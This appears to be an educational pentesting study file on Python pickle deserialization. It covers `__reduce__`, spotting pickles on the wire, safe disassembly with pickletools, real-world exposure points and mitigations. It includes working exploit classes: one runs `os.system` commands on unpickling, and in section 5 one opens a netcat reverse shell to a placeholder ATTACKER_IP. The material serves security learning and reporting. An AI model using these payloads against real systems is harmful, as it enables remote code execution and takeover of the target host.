# 06 — Python Pickle Deserialization

**Scope note**: This file covers real-world, industry-standard Python deserialization risk.
PortSwigger Web Security Academy does not currently include a dedicated Python/pickle lab, so
this section is *not* mapped to an Academy lab in File 09 — practice it in your own local
Python environment (a simple Flask/Django app you write yourself, or a Docker-based vulnerable
app) rather than expecting it on the Academy.

## 1. Why Pickle Is the Most Direct Deserialization Primitive Covered in This Series

Python's `pickle` module is the native way to serialize ("pickle") and deserialize ("unpickle")
almost any Python object. Compared to PHP and Java, pickle exploitation requires no
chain-hunting through third-party libraries at all in the common case — Python gives you a
single, built-in, explicitly-documented mechanism for running arbitrary code during
unpickling, by design, as part of how the format supports reconstructing complex objects.

The official Python documentation itself warns that the `pickle` module is **not secure against
erroneous or maliciously constructed data** — this is one of the few cases where the vendor's
own docs explicitly state the exploitation primitive rather than it being discovered through
research, which is worth citing directly in any report to a client whose application unpickles
user input.

## 2. The Automatic Call Point: `__reduce__`

When Python pickles an object, it can call that object's `__reduce__()` method to determine
*how* to reconstruct it. `__reduce__()` is expected to return a tuple of the form:

```python
(callable, args_tuple)
```

When the pickle is later **unpickled**, Python's unpickler calls:

```python
callable(*args_tuple)
```

— automatically, as part of reconstruction, with no further checks. This is the entire
vulnerability in one sentence: **you get to choose `callable` and `args_tuple` yourself**, and
the unpickling process will call that callable with those arguments, unconditionally.

### Minimal exploit class, piece by piece

```python
import pickle
import os

class Exploit:
    def __reduce__(self):
        return (os.system, ("id; whoami",))

payload = pickle.dumps(Exploit())
```

- `class Exploit:` — any class name; it never needs to relate to anything in the target
  application, since pickle doesn't care what the class "means," only what `__reduce__` returns.
- `def __reduce__(self):` — overriding this method is the entire exploitation technique; this is
  pickle's equivalent of PHP's `__wakeup()` or Java's `readObject()`.
- `return (os.system, ("id; whoami",))` — the tuple's first element, `os.system`, is the
  **callable** that will be invoked on the target at unpickling time. The second element,
  `("id; whoami",)`, is the **argument tuple** passed to it — note the trailing comma, which is
  required Python syntax to make this a one-element tuple rather than just a parenthesized
  string.
- `pickle.dumps(Exploit())` — instantiate the exploit class and immediately serialize
  ("pickle") it into bytes. `dumps` = "dump to a string" (really bytes); the resulting `payload`
  variable is exactly what you'd deliver to the target's `pickle.loads()` call.

### What happens on the target

```python
pickle.loads(payload)  # the target's vulnerable code, operating on your bytes
```

The moment this line runs on the target, the unpickler reconstructs your `Exploit` object,
which means calling `os.system("id; whoami")` — **before your code on the target even finishes
"constructing" the object**. You don't need the application to do anything else with the
unpickled result; the act of unpickling alone is the full exploit. This is meaningfully more
direct than the Java/PHP cases, where you typically need the chain to walk through several
classes before reaching a sink — in pickle, `__reduce__` *is* both the automatic call point and
the sink, collapsed into one step, for the common case.

## 3. Recognizing Pickle Data on the Wire

Pickle has multiple protocol versions (0 through 5 as of recent Python versions), each with
slightly different byte framing, but in practice:

- Protocol 0 (the oldest, ASCII-based) is human-readable text and visually distinctive.
- Protocols 2+ (the common modern default) start with the byte `\x80` followed by a protocol
  version number byte, then opcode bytes.
- If you see a Base64-decoded blob beginning with `gA` (which is `\x80` Base64-encoded) followed
  by further opcode-looking bytes, that's a strong signal of a modern-protocol pickle.

A genuinely useful detection/audit habit: run `pickletools.dis(data)` (Python's built-in pickle
disassembler) against any suspected pickle blob — it prints every opcode in human-readable form,
including any `GLOBAL` opcodes, which name the exact module and callable a pickle will invoke
(e.g. `GLOBAL 'os system'`), letting you confirm malicious intent or scope of access **without
actually executing the pickle** — critical for safely triaging a suspicious sample you've found
rather than risking running it.

```bash
python3 -c "import pickle, pickletools; pickletools.dis(open('suspect.pkl','rb').read())"
```

- `python3 -c "..."` — run an inline Python one-liner instead of a script file.
- `import pickle, pickletools` — `pickletools` is the disassembler module; `pickle` itself isn't
  even used here since we deliberately avoid calling `loads()`.
- `pickletools.dis(open('suspect.pkl','rb').read())` — `open(..., 'rb')` opens the file in
  binary read mode (pickles are binary data, not text), `.read()` returns its full byte content,
  and `pickletools.dis()` disassembles and prints every opcode in that byte stream to your
  terminal for safe manual inspection.

## 4. Where Pickle Shows Up in Real Applications

- **ML/data science pipelines**: trained model objects (scikit-learn, older PyTorch checkpoints)
  are frequently pickled and loaded directly via `pickle.load()` — a very common, very real
  supply-chain risk if a model file is downloaded from an untrusted source (a public model hub,
  a third-party API response) and loaded without validation.
- **Caching layers**: Django/Flask apps using `pickle` to serialize session data or cache values
  into Redis/Memcached/disk — if any of that cached data's *key* or *source* is even partially
  attacker-influenced, this becomes directly exploitable.
- **Inter-process/queue communication**: internal microservice messages passed as pickled
  Python objects over a message queue (Celery historically defaulted to pickle as its task
  serializer in older versions) — if any queue input is reachable from outside the trust
  boundary, this is a direct RCE path.
- **`subprocess`/multiprocessing internals**: less common as a direct attack surface, but worth
  knowing that Python's `multiprocessing` module also uses pickle internally to pass data
  between processes.

## 5. Other Dangerous Classes Beyond `os.system`

`__reduce__` works with **any** callable, not just `os.system`. Other useful sinks during real
exploitation:

```python
import subprocess
class Exploit:
    def __reduce__(self):
        return (subprocess.Popen, (["nc", "-e", "/bin/sh", "ATTACKER_IP", "4444"],))
```

- `subprocess.Popen` — a more flexible process-spawning callable than `os.system`, taking a list
  of arguments rather than a single shell string (avoids shell-quoting issues for more complex
  commands).
- The arguments list `["nc", "-e", "/bin/sh", "ATTACKER_IP", "4444"]` here is a classic netcat
  reverse shell invocation: `nc` = netcat, `-e /bin/sh` tells netcat to execute a shell and bind
  its input/output to the network connection, and the IP/port are your listening attacker
  machine — replace `ATTACKER_IP` with your actual listener address before generating the
  pickle.

## 6. Mitigations Worth Knowing (For Reporting)

The standard, vendor-recommended fix is to **never unpickle data from an untrusted source at
all** — switch to a data-only format (plain JSON, which cannot carry executable callables) for
any data that crosses a trust boundary. Where pickling internal-only data is unavoidable,
`hmac`-signing the pickle bytes before storage and verifying the signature before unpickling
(so tampered data is rejected before it ever reaches `pickle.loads()`) is the standard
defense-in-depth pattern worth recommending in a report.

## 7. What's Next

File 07 covers .NET — a more fragmented landscape than Python's single `pickle` module, since
.NET has several competing serializers (BinaryFormatter, JSON.NET, DataContractSerializer) each
with their own exploitation mechanics, and a dedicated tool (ysoserial.net) analogous to
File 05's ysoserial.

---
*Sensitive topic note: none — this file is purely technical/educational security content.*
